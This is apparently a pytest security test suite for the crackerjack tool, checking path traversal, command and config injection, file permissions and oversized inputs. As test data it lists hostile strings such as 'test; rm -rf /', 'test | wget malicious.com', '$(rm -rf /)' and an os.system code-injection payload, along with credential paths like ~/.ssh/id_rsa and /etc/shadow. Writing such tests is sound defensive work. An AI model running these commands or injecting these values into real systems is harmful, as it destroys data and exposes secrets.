"""
Security validation tests for crackerjack components.

These tests verify security measures, input validation, and protection
against common vulnerabilities in crackerjack operations.
"""

import os
import subprocess
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from crackerjack.services.filesystem import FileSystemService
from crackerjack.services.git import GitService
from crackerjack.services.security import SecurityService


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization"""

    def test_filesystem_path_validation(self, temp_dir):
        """Test filesystem service validates paths securely"""
        fs_service = FileSystemService()

        # Test path traversal attempts
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/shadow",
            "~/.ssh/id_rsa",
            temp_dir / ".." / ".." / "sensitive_file.txt",
        ]

        for dangerous_path in dangerous_paths:
            # Should either reject the path or handle it safely
            try:
                # Most operations should fail for dangerous paths
                exists = fs_service.file_exists(str(dangerous_path))

                # If it doesn't fail, it should not access sensitive areas
                if exists:
                    # The path should be normalized/contained
                    normalized = Path(str(dangerous_path)).resolve()
                    assert not str(normalized).startswith("/etc")
                    assert not str(normalized).startswith("/root")

            except (OSError, ValueError, PermissionError):
                # Expected behavior for dangerous paths
                pass

    def test_command_injection_protection(self):
        """Test protection against command injection"""
        # Test that shell commands are properly escaped
        malicious_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | wget malicious.com",
            "test $(rm important.txt)",
            "test `cat /etc/hosts`",
            "test; echo 'malicious' > /tmp/hack",
        ]

        for malicious_input in malicious_inputs:
            # Any subprocess calls should sanitize inputs
            # Test with mock to verify proper escaping
            with patch("subprocess.run") as mock_run:
                mock_run.return_value = Mock(returncode=0, stdout=b"", stderr=b"")

                # Example of what secure code should do
                try:
                    # Should not pass malicious input directly to shell
                    result = subprocess.run(
                        ["echo", malicious_input],  # Array form prevents injection
                        capture_output=True,
                        text=True,
                        check=False,
                    )
                    # This is safe because we use array form
                    assert result.returncode == 0
                except Exception:
                    # If it fails, that's also acceptable
                    pass


@pytest.mark.security
class TestFileSystemSecurity:
    """Test filesystem security measures"""

    def test_temporary_file_security(self, temp_dir):
        """Test secure temporary file creation"""
        fs_service = FileSystemService()

        # Create temporary file securely
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".txt", delete=False
        ) as tmp_file:
            tmp_path = tmp_file.name
            tmp_file.write("Secure temporary content")

        try:
            # Verify file was created
            assert fs_service.file_exists(tmp_path)

            # Read content back
            content = fs_service.read_file(tmp_path)
            assert "Secure temporary content" == content

            # Check file permissions (Unix-like systems)
            if os.name != "nt":  # Not Windows
                stat_info = os.stat(tmp_path)
                permissions = oct(stat_info.st_mode)[-3:]
                # Should not be world-readable (last digit should be 0-3)
                assert int(permissions[-1]) <= 3

        finally:
            # Clean up
            if os.path.exists(tmp_path):
                os.unlink(tmp_path)

    def test_directory_traversal_protection(self, temp_dir):
        """Test protection against directory traversal attacks"""
        fs_service = FileSystemService()

        # Create a file in temp directory
        safe_file = temp_dir / "safe_file.txt"
        fs_service.write_file(str(safe_file), "Safe content")

        # Attempt directory traversal
        traversal_attempts = [
            temp_dir / ".." / "dangerous_file.txt",
            temp_dir / ".." / ".." / "etc" / "passwd",
            temp_dir / ".." / "sensitive.txt",
        ]

        for attempt in traversal_attempts:
            try:
                # Should not create files outside temp directory
                fs_service.write_file(str(attempt), "Should not create this")

                # If file was created, verify it's still within allowed area
                if attempt.exists():
                    resolved_path = attempt.resolve()
                    temp_dir.resolve()

                    # File should be within temp directory or its parents
                    # (depending on implementation)
                    assert resolved_path != Path("/etc/passwd").resolve()

            except (OSError, PermissionError, ValueError):
                # Expected behavior for traversal attempts
                pass

    def test_file_permission_handling(self, temp_dir):
        """Test proper handling of file permissions"""
        fs_service = FileSystemService()

        if os.name == "nt":  # Windows
            pytest.skip("Permission tests not applicable on Windows")

        # Create file with restricted permissions
        restricted_file = temp_dir / "restricted.txt"
        restricted_file.write_text("Initial content")
        restricted_file.chmod(0o000)  # No permissions

        try:
            # Should handle permission errors gracefully
            with pytest.raises((PermissionError, OSError)):
                fs_service.read_file(str(restricted_file))

        finally:
            # Restore permissions for cleanup
            try:
                restricted_file.chmod(0o644)
            except Exception:
                pass


@pytest.mark.security
class TestSecurityService:
    """Test dedicated security service functionality"""

    def test_security_service_initialization(self):
        """Test SecurityService can be initialized"""
        security = SecurityService()
        assert security is not None

    def test_input_sanitization(self, security_test_data):
        """Test input sanitization functionality"""
        security = SecurityService()

        # Test malicious inputs
        for malicious_input in security_test_data["malicious_inputs"]:
            sanitized = security.sanitize_input(malicious_input)

            # Should be sanitized (different from original or empty)
            assert sanitized != malicious_input or sanitized == ""

        # Test valid inputs (should pass through)
        for valid_input in security_test_data["valid_inputs"]:
            sanitized = security.sanitize_input(valid_input)

            # Valid inputs should be preserved or minimally changed
            assert len(sanitized) > 0

    def test_file_path_validation(self, temp_dir):
        """Test file path security validation"""
        security = SecurityService()

        # Test safe paths
        safe_paths = [
            str(temp_dir / "safe_file.txt"),
            str(temp_dir / "subdir" / "file.txt"),
            "relative_file.txt",
        ]

        for safe_path in safe_paths:
            is_safe = security.validate_file_path(safe_path)
            assert is_safe is True

        # Test dangerous paths
        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/shadow",
            "~/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\sam",  # Windows path
        ]

        for dangerous_path in dangerous_paths:
            is_safe = security.validate_file_path(dangerous_path)
            assert is_safe is False

    def test_permission_checking(self, temp_dir):
        """Test file permission validation"""
        security = SecurityService()

        # Create test file
        test_file = temp_dir / "permission_test.txt"
        test_file.write_text("Test content")

        # Test read permission
        has_read = security.check_permissions(str(test_file), "read")
        assert has_read is True

        # Test write permission
        has_write = security.check_permissions(str(test_file), "write")
        assert has_write is True

        # Test non-existent file
        fake_file = temp_dir / "does_not_exist.txt"
        has_permission = security.check_permissions(str(fake_file), "read")
        assert has_permission is False


@pytest.mark.security
class TestGitSecurityIntegration:
    """Test git operations security"""

    def test_git_command_safety(self, temp_project_dir):
        """Test git commands are executed safely"""
        original_cwd = os.getcwd()
        os.chdir(temp_project_dir)

        try:
            git_service = GitService()

            # Test safe git operations
            with patch("subprocess.run") as mock_run:
                mock_run.return_value = Mock(returncode=0, stdout=b"main\n", stderr=b"")

                # This should use safe subprocess calls
                git_service.get_current_branch()

                # Verify subprocess was called safely
                mock_run.assert_called()

                # Check that shell=True was not used
                call_args = mock_run.call_args
                if "shell" in call_args.kwargs:
                    assert call_args.kwargs["shell"] is False

        finally:
            os.chdir(original_cwd)

    def test_git_repository_validation(self, temp_dir):
        """Test git repository path validation"""
        git_service = GitService()

        # Test with non-git directory
        non_git_dir = temp_dir / "not_a_git_repo"
        non_git_dir.mkdir()

        original_cwd = os.getcwd()
        os.chdir(non_git_dir)

        try:
            # Should handle non-git directories safely
            is_repo = git_service.is_git_repo()
            assert is_repo is False

        except Exception:
            # If it raises an exception, that's also acceptable
            pass
        finally:
            os.chdir(original_cwd)


@pytest.mark.security
class TestConfigurationSecurity:
    """Test configuration security measures"""

    def test_config_file_validation(self, temp_dir):
        """Test configuration file security validation"""
        from crackerjack.services.config import ConfigurationService

        config_service = ConfigurationService()

        # Test malicious config content
        malicious_config = temp_dir / "malicious.toml"
        malicious_content = """
[tool.crackerjack]
test_timeout = 999999  # Extremely high timeout
test_workers = -1       # Invalid worker count
project_path = "../../../etc"  # Path traversal attempt
        """
        malicious_config.write_text(malicious_content.strip())

        try:
            # Should handle malicious config safely
            config = config_service.load_config_from_file(str(malicious_config))

            # If config loads, validate values are sensible
            if config and isinstance(config, dict):
                if "test_timeout" in config:
                    # Should not allow unreasonable timeouts
                    assert config["test_timeout"] <= 3600  # Max 1 hour

                if "test_workers" in config:
                    # Should validate worker count
                    assert config["test_workers"] >= 1

        except Exception:
            # If it rejects malicious config, that's good
            pass

    def test_config_injection_protection(self):
        """Test protection against config injection attacks"""
        from crackerjack.services.config import ConfigurationService

        config_service = ConfigurationService()

        # Test config merging with malicious overrides
        base_config = {
            "test_timeout": 60,
            "test_workers": 2,
            "project_path": "/safe/path",
        }

        malicious_overrides = {
            "test_timeout": "$(rm -rf /)",  # Command injection attempt
            "project_path": "../../../etc",  # Path traversal
            "test_workers": 'eval(\'__import__("os").system("whoami")\')',  # Code injection
        }

        try:
            merged = config_service.merge_configs(base_config, malicious_overrides)

            # If merge succeeds, values should be sanitized
            if merged:
                # Values should not contain shell commands
                for key, value in merged.items():
                    if isinstance(value, str):
                        assert "$(" not in value
                        assert "eval(" not in value
                        assert "__import__" not in value

        except Exception:
            # If merge fails with malicious data, that's acceptable
            pass


@pytest.mark.security
@pytest.mark.slow
class TestDenialOfServiceProtection:
    """Test protection against DoS attacks"""

    def test_large_file_handling(self, temp_dir):
        """Test handling of unreasonably large files"""
        fs_service = FileSystemService()

        # Create a moderately large file (1MB)
        large_file = temp_dir / "large_test.txt"
        content = "A" * (1024 * 1024)  # 1MB

        # Should handle reasonably large files
        fs_service.write_file(str(large_file), content)
        read_content = fs_service.read_file(str(large_file))

        assert len(read_content) == len(content)

        # Test with extremely large content (10MB)
        # This should either work or fail gracefully
        huge_content = "B" * (10 * 1024 * 1024)  # 10MB
        huge_file = temp_dir / "huge_test.txt"

        try:
            fs_service.write_file(str(huge_file), huge_content)
            read_huge = fs_service.read_file(str(huge_file))
            assert len(read_huge) == len(huge_content)
        except (MemoryError, OSError):
            # Acceptable to fail with very large files
            pass

    def test_deep_recursion_protection(self, temp_dir):
        """Test protection against deep recursion attacks"""
        fs_service = FileSystemService()

        # Create moderately deep directory structure
        current_path = temp_dir
        for i in range(50):  # 50 levels deep
            current_path = current_path / f"level_{i}"

        try:
            # Should handle reasonable depth
            fs_service.create_directory(str(current_path))
            assert current_path.exists()

        except (OSError, RecursionError):
            # May fail with very deep structures - that's acceptable
            pass

        # Test extremely deep structure (500 levels)
        extremely_deep = temp_dir
        for i in range(500):
            extremely_deep = extremely_deep / f"deep_{i}"

        try:
            # This might fail, and that's OK for security
            fs_service.create_directory(str(extremely_deep))
        except (OSError, RecursionError):
            # Expected behavior for extreme cases
            pass
